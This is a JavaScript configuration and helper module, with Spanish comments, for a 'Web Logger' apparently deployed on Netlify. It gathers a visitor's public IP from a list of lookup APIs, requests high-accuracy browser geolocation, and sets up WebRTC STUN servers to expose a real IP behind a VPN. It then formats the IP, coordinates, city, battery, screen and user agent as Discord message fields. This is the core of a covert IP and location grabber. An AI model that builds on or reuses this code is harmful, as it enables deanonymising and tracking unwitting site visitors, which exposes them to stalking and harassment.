// Detectar si estamos en Netlify
const isNetlify = window.location.hostname.includes('netlify.app') || 
                  window.location.hostname.includes('netlify.com') ||
                  window.location.hostname.includes('netlify');

// Configuración para el Web Logger
const LoggerConfig = {
    // Detectar entorno
    environment: isNetlify ? 'netlify' : 'local',
    // APIs para obtener IP y geolocalización (ordenadas por confiabilidad)
    ipApis: [
        'https://ipapi.co/json/',
        'https://ipinfo.io/json',
        'https://ip-api.com/json/',
        'https://api.ipify.org?format=json',
        'https://api.db-ip.com/v2/free/self',
        'https://freeipapi.com/api/json',
        'https://ipapi.co/json/?key=free',
        'https://ipapi.co/json/?fields=ip,country_name,region,city,latitude,longitude,timezone,org'
    ],
    
    // APIs para geolocalización por IP (ordenadas por precisión)
    geoApis: [
        'https://ipapi.co/{ip}/json/',
        'https://ipinfo.io/{ip}/json',
        'https://ip-api.com/json/{ip}',
        'https://api.db-ip.com/v2/free/{ip}',
        'https://freeipapi.com/api/json/{ip}',
        'https://ipapi.co/{ip}/json/?key=free',
        'https://ipapi.co/{ip}/json/?fields=ip,country_name,region,city,latitude,longitude,timezone,org'
    ],
    
    // Configuración de timeouts (optimizados para máxima confiabilidad)
    timeouts: {
        apiRequest: 15000,
        geolocation: 25000,
        webRTC: 12000
    },
    
    // Configuración de geolocalización del navegador (máxima precisión)
    geolocationOptions: {
        enableHighAccuracy: true,
        timeout: 20000,
        maximumAge: 60000
    },
    
    // Configuración de WebRTC
    webRTCConfig: {
        iceServers: [
            { urls: 'stun:stun.l.google.com:19302' },
            { urls: 'stun:stun1.l.google.com:19302' },
            { urls: 'stun:stun2.l.google.com:19302' }
        ]
    },
    
    // Configuración de Discord
    discord: {
        maxFieldLength: 1024,
        maxDescriptionLength: 4096,
        maxTitleLength: 256
    },
    
    // Configuración de logging
    logging: {
        enableConsoleLogs: true,
        enableDetailedLogs: true
    },
    
    // Configuración específica para Netlify
    netlify: {
        enableCORS: true,
        useProxy: false,
        retryAttempts: 3,
        retryDelay: 1000
    }
};

// Función para hacer requests con timeout y reintentos
async function fetchWithTimeout(url, options = {}, timeout = 5000, retries = 3) {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), timeout);
    
    try {
        const response = await fetch(url, {
            ...options,
            signal: controller.signal,
            mode: 'cors',
            credentials: 'omit'
        });
        clearTimeout(timeoutId);
        return response;
    } catch (error) {
        clearTimeout(timeoutId);
        
        // Reintentar si hay errores de red y quedan intentos
        if (retries > 0 && (error.name === 'AbortError' || error.name === 'TypeError')) {
            console.log(`🔄 Reintentando request a ${url}, intentos restantes: ${retries - 1}`);
            await new Promise(resolve => setTimeout(resolve, LoggerConfig.netlify.retryDelay));
            return fetchWithTimeout(url, options, timeout, retries - 1);
        }
        
        throw error;
    }
}

// Función para validar IP
function isValidIP(ip) {
    const ipRegex = /^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
    return ipRegex.test(ip);
}

// Función para validar coordenadas
function isValidCoordinates(lat, lon) {
    return lat >= -90 && lat <= 90 && lon >= -180 && lon <= 180;
}

// Función para formatear datos para Discord
function formatDiscordData(data) {
    const formatted = {};
    
    // Formatear IP
    formatted.ip = data.publicIP || 'No disponible';
    
    // Formatear ubicación
    if (data.location && typeof data.location === 'object') {
        const loc = data.location;
        formatted.location = loc.city && loc.country ? 
            `${loc.city}, ${loc.country}` : 
            (loc.country || 'No disponible');
        
        formatted.coordinates = (loc.latitude && loc.longitude) ? 
            `${loc.latitude}, ${loc.longitude}` : 
            'No disponible';
    } else {
        formatted.location = 'No disponible';
        formatted.coordinates = 'No disponible';
    }
    
    // Formatear batería
    if (data.battery && typeof data.battery === 'object') {
        formatted.battery = `${data.battery.level} ${data.battery.charging ? '(Cargando)' : ''}`;
    } else {
        formatted.battery = 'No disponible';
    }
    
    // Formatear pantalla
    if (data.screen && typeof data.screen === 'object') {
        formatted.screen = `${data.screen.width}x${data.screen.height}`;
    } else {
        formatted.screen = 'No disponible';
    }
    
    // Formatear User Agent
    if (data.userAgent) {
        formatted.userAgent = data.userAgent.length > 100 ? 
            data.userAgent.substring(0, 100) + '...' : 
            data.userAgent;
    } else {
        formatted.userAgent = 'No disponible';
    }
    
    return formatted;
}

// Exportar configuración
if (typeof module !== 'undefined' && module.exports) {
    module.exports = { LoggerConfig, fetchWithTimeout, isValidIP, isValidCoordinates, formatDiscordData };
}
